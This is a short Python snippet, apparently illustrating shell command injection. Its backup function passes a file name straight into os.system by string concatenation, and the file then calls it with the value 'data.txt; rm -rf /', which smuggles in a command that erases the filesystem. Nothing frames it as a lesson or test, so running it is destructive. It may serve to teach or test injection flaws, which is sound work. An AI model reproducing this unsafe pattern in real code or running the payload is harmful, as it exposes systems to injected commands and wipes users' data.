import os

def backup(file_name):
    os.system("tar -czf backup.tar.gz " + file_name)

backup("data.txt; rm -rf /")
